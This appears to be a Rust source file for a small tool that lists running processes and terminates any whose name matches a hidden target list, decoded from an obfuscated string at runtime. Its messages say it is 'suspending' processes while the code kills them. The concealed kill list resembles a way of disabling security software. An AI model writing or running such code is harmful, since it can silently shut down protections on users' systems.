use psutil::{
    self,
    process::{self, Process, ProcessError}
};
mod decoder;
mod printer;


fn main() {
    let pid_vec = process::processes().unwrap();
    let tgt_vec = build_target();

    let mut suspended = 0;
    let mut total     = 0;

    for pid_result in pid_vec.into_iter() {
        match pid_result {
            Ok(proc) => {
                if suspend_target_proc(&proc, &tgt_vec) {
                    suspended += 1;
                }
                total += 1;
            }, 
            Err(err) => {
                handle_proc_error(err);
            },
        }
    }
    println!("[ * ] Done! [ {} / {} ]", suspended, total);
}

fn handle_proc_error(err: ProcessError) {
    match err {
        ProcessError::NoSuchProcess { pid     } => { println!("[ ✕ ] no corresponding Process ( pid {} )", pid) }, 
        ProcessError::ZombieProcess { pid     } => { println!("[ ✕ ] is Zombie Process ( pid {} )", pid) }, 
        ProcessError::AccessDenied  { pid     } => { println!("[ ✕ ] Access Denied ( pid {} )", pid) }, 
        ProcessError::PsutilError   { pid, .. } => { println!("[ ✕ ] Package Error ( pid {} )", pid) }, 
    };
}

fn suspend_target_proc(proc: &Process, target_vec: &Vec<String>) -> bool {
    let proc_name_result = proc.name();

    if proc_name_result.is_err() {
        return false;
    }

    let proc_name = proc_name_result.unwrap();

    if !target_vec.contains(&proc_name) {
        return false;
    }

    println!("[ ✓ ] Process suspending... ( {} )", &proc_name);

    proc.terminate().is_ok()
}

fn build_target() -> Vec<String> {
    let bytes = decoder::decode("EHQ&*E--2@:2OENF*)G@G@b5lB4Yt&:2OENF*)G@G@b6)G&g>qBP)-n@sWH<:2XZ^GA;AJAn1");

    if bytes.is_err() {
        panic!("[ ✕ ] Decoder decode failed...");
    }

    String::from_utf8(bytes.unwrap()).unwrap().split("N").map(str::to_string).collect()
}
